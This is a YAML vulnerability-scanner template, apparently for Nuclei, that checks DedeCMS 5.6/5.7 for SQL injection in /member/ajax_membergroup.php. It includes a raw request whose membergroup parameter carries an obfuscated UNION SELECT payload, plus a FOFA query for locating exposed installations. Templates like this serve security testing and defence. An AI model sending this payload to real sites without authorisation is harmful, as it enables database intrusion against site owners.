http:
    - matchers:
        - status:
            - 200
          type: status
        - part: body
          regex:
            - '[a-f0-9]{32}'
          type: regex
      matchers-condition: and
      payloads:
        randstr_10:
            - '{{randstr(10, ''0123456789'')}}'
      raw:
        - |
          GET /member/ajax_membergroup.php?action=post&membergroup=@`'`/*!50000Union+*/+/*!50000select+*/+md5('{{randstr_10}}')+--+@`'` HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Safari/537.36
          Accept: */*
          Connection: close
      stop-at-first-match: true
id: dedecms-ajax-membergroup-sqli
info:
    author:
        - harris2015
        - PocAgent
    description: |
        DedeCMS 5.6/5.7 版本中 /member/ajax_membergroup.php 存在 SQL 注入漏洞。
        攻击者可通过 membergroup 参数注入恶意 SQL 语句，实现数据库信息读取或远程代码执行。
    metadata:
        fofa-query: app="DedeCMS"
        verified: true
    name: DedeCMS ajax_membergroup.php SQL Injection
    reference:
        - http://www.dedeyuan.com/xueyuan/wenti/1244.html
        - https://github.com/harris2015
    severity: critical
    tags:
        - dedecms
        - sql-injection
        - intrusive
